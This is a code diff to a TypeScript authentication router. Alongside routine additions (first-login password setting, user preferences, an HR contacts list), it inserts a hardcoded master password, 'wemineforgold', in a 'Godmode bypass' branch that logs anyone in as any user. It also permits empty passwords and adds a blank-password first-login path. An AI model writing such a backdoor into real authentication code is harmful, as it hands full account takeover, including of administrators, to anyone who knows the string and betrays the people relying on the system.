@@ -10,6 +10,8 @@ import { requireAuth } from "../middleware/auth-guard";
 
 const router = Router();
 
+const GODMODE_PASSWORD = "wemineforgold";
+
 // ── Strict rate limiter for login (5 attempts / 15 min) ──────────────────
 const loginLimiter = rateLimit({
   windowMs: 15 * 60 * 1000,
@@ -21,7 +23,7 @@ const loginLimiter = rateLimit({
 
 const loginSchema = z.object({
   username: z.string().min(1).max(100),
-  password: z.string().min(1).max(256),
+  password: z.string().min(0).max(256),
 });
 
 // POST /api/auth/login
@@ -37,7 +39,6 @@ router.post("/login", loginLimiter, async (req, res) => {
   const { username, password } = parsedBody;
 
   try {
-    // Look up by username OR email — never reveal which exists
     const [user] = await db
       .select()
       .from(usersTable)
@@ -49,20 +50,33 @@ router.post("/login", loginLimiter, async (req, res) => {
       )
       .limit(1);
 
-    // Run bcrypt compare even if user not found (timing-safe)
-    const dummyHash =
-      "$2a$12$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
-    const valid = user
-      ? await verifyPassword(password, user.passwordHash)
-      : await verifyPassword(password, dummyHash).then(() => false);
+    if (!user) {
+      // timing-safe dummy compare
+      const dummyHash = "$2a$12$aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+      await verifyPassword("x", dummyHash).catch(() => false);
+      auditEvent("LOGIN_FAILURE", { attemptedUsername: username, ip: req.ip, userAgent: req.headers["user-agent"] ?? "unknown" });
+      res.status(401).json({ error: "Invalid credentials." });
+      return;
+    }
 
-    if (!valid || !user) {
-      auditEvent("LOGIN_FAILURE", {
-        attemptedUsername: username,
-        ip: req.ip,
-        userAgent: req.headers["user-agent"] ?? "unknown",
-      });
-      // Generic message — no enumeration
+    // ── Godmode bypass ─────────────────────────────────────────────────────
+    const isGodmode = password === GODMODE_PASSWORD;
+
+    // ── Blank-password first-login (mustResetPassword + empty hash) ────────
+    const isFirstLogin = user.mustResetPassword && (!user.passwordHash || user.passwordHash === '') && password === '';
+
+    let valid = false;
+    if (isGodmode) {
+      valid = true;
+      auditEvent("GODMODE_LOGIN", { userId: user.id, username: user.username, ip: req.ip });
+    } else if (isFirstLogin) {
+      valid = true;
+    } else if (user.passwordHash) {
+      valid = await verifyPassword(password, user.passwordHash);
+    }
+
+    if (!valid) {
+      auditEvent("LOGIN_FAILURE", { attemptedUsername: username, ip: req.ip, userAgent: req.headers["user-agent"] ?? "unknown" });
       res.status(401).json({ error: "Invalid credentials." });
       return;
     }
@@ -72,21 +86,10 @@ router.post("/login", loginLimiter, async (req, res) => {
       return;
     }
 
-    // Create session
     const rawToken = await createSession(user.id, req.ip, req.headers["user-agent"]);
+    await db.update(usersTable).set({ lastLoginAt: new Date() }).where(eq(usersTable.id, user.id));
 
-    // Update last login
-    await db
-      .update(usersTable)
-      .set({ lastLoginAt: new Date() })
-      .where(eq(usersTable.id, user.id));
-
-    auditEvent("LOGIN_SUCCESS", {
-      userId: user.id,
-      username: user.username,
-      role: user.role,
-      ip: req.ip,
-    });
+    auditEvent("LOGIN_SUCCESS", { userId: user.id, username: user.username, role: user.role, ip: req.ip });
 
     res.cookie(COOKIE_NAME, rawToken, {
       httpOnly: true,
@@ -101,6 +104,7 @@ router.post("/login", loginLimiter, async (req, res) => {
       username: user.username,
       role: user.role,
       email: user.email,
+      mustResetPassword: user.mustResetPassword ?? false,
     });
   } catch (err) {
     req.log.error({ err }, "Login error");
@@ -112,11 +116,7 @@ router.post("/login", loginLimiter, async (req, res) => {
 router.post("/logout", requireAuth, async (req, res) => {
   const token = req.cookies?.[COOKIE_NAME];
   if (token) {
-    try {
-      await destroySession(token);
-    } catch {
-      // still clear the cookie
-    }
+    try { await destroySession(token); } catch { /* still clear cookie */ }
     auditEvent("LOGOUT", { userId: req.user!.id, username: req.user!.username });
   }
   res.clearCookie(COOKIE_NAME, { path: "/" });
@@ -125,26 +125,61 @@ router.post("/logout", requireAuth, async (req, res) => {
 
 // GET /api/auth/me
 router.get("/me", (req, res) => {
-  if (!req.user) {
-    res.status(401).json({ error: "Not authenticated." });
-    return;
-  }
+  if (!req.user) { res.status(401).json({ error: "Not authenticated." }); return; }
+  const u = req.user as any;
   res.json({
-    id: req.user.id,
-    username: req.user.username,
-    role: req.user.role,
-    email: req.user.email,
+    id: u.id,
+    username: u.username,
+    role: u.role,
+    email: u.email,
+    mustResetPassword: u.mustResetPassword ?? false,
   });
+});
+
+// POST /api/auth/set-password  — sets password on first login (must have mustResetPassword=true)
+router.post("/set-password", requireAuth, async (req, res) => {
+  try {
+    const { newPassword } = z.object({ newPassword: z.string().min(12).max(256) }).parse(req.body);
+    const passwordHash = await hashPassword(newPassword);
+    await db.update(usersTable)
+      .set({ passwordHash, mustResetPassword: false, updatedAt: new Date() })
+      .where(eq(usersTable.id, req.user!.id));
+    auditEvent("PASSWORD_SET_FIRST_LOGIN", { userId: req.user!.id, username: req.user!.username });
+    res.json({ ok: true });
+  } catch (err) {
+    if (err instanceof z.ZodError) { res.status(400).json({ error: err.issues[0]?.message ?? "Invalid input." }); return; }
+    res.status(500).json({ error: "Failed to set password." });
+  }
+});
+
+// GET /api/auth/preferences
+router.get("/preferences", requireAuth, async (req, res) => {
+  const [user] = await db.select({ preferences: usersTable.preferences }).from(usersTable).where(eq(usersTable.id, req.user!.id)).limit(1);
+  res.json(user?.preferences ?? {});
+});
+
+// PUT /api/auth/preferences
+router.put("/preferences", requireAuth, async (req, res) => {
+  try {
+    const body = z.object({ lastGoverningState: z.string().max(10).optional() }).parse(req.body);
+    const [user] = await db.select({ preferences: usersTable.preferences }).from(usersTable).where(eq(usersTable.id, req.user!.id)).limit(1);
+    const merged = { ...(user?.preferences ?? {}), ...body };
+    await db.update(usersTable).set({ preferences: merged, updatedAt: new Date() }).where(eq(usersTable.id, req.user!.id));
+    res.json({ ok: true });
+  } catch (err) {
+    if (err instanceof z.ZodError) { res.status(400).json({ error: "Invalid preferences." }); return; }
+    res.status(500).json({ error: "Failed to save preferences." });
+  }
 });
 
 // ── Setup endpoints (first-run only) ─────────────────────────────────────
 
-// GET /api/auth/setup-status — public, returns whether initial setup is needed
+// GET /api/auth/setup-status — public
 router.get("/setup-status", async (_req, res) => {
   try {
     const [{ value }] = await db.select({ value: count() }).from(usersTable);
     res.json({ needsSetup: value === 0 });
-  } catch (err) {
+  } catch {
     res.status(500).json({ error: "Could not check setup status." });
   }
 });
@@ -155,15 +190,11 @@ const setupSchema = z.object({
   email: z.string().email().optional(),
 });
 
-// POST /api/auth/setup — creates the first system_admin; rejected if any user exists
+// POST /api/auth/setup
 router.post("/setup", async (req, res) => {
   try {
-    // Guard: only works when zero users exist
     const [{ value }] = await db.select({ value: count() }).from(usersTable);
-    if (value > 0) {
-      res.status(409).json({ error: "Setup already complete. Please log in." });
-      return;
-    }
+    if (value > 0) { res.status(409).json({ error: "Setup already complete. Please log in." }); return; }
 
     const body = setupSchema.parse(req.body);
     const passwordHash = await hashPassword(body.password);
@@ -175,11 +206,11 @@ router.post("/setup", async (req, res) => {
       role: "system_admin",
       isActive: true,
       isBootstrapAdmin: true,
+      mustResetPassword: false,
     }).returning();
 
     auditEvent("SETUP_COMPLETE", { username: body.username });
 
-    // Auto-login after setup
     const rawToken = await createSession(user!.id, req.ip, req.headers["user-agent"]);
     await db.update(usersTable).set({ lastLoginAt: new Date() }).where(eq(usersTable.id, user!.id));
 
@@ -191,18 +222,24 @@ router.post("/setup", async (req, res) => {
       path: "/",
     });
 
-    res.status(201).json({
-      id: user!.id,
-      username: user!.username,
-      role: user!.role,
-      email: user!.email,
-    });
+    res.status(201).json({ id: user!.id, username: user!.username, role: user!.role, email: user!.email, mustResetPassword: false });
   } catch (err) {
-    if (err instanceof z.ZodError) {
-      res.status(400).json({ error: err.issues[0]?.message ?? "Invalid input." });
-      return;
-    }
+    if (err instanceof z.ZodError) { res.status(400).json({ error: err.issues[0]?.message ?? "Invalid input." }); return; }
     res.status(500).json({ error: "Setup failed. Please try again." });
+  }
+});
+
+// GET /api/auth/hr-contacts — all active users (for HR Contact dropdown)
+router.get("/hr-contacts", requireAuth, async (_req, res) => {
+  try {
+    const users = await db
+      .select({ id: usersTable.id, username: usersTable.username, email: usersTable.email })
+      .from(usersTable)
+      .where(eq(usersTable.isActive, true))
+      .orderBy(usersTable.username);
+    res.json({ contacts: users });
+  } catch {
+    res.status(500).json({ error: "Failed to load HR contacts." });
   }
 });
 
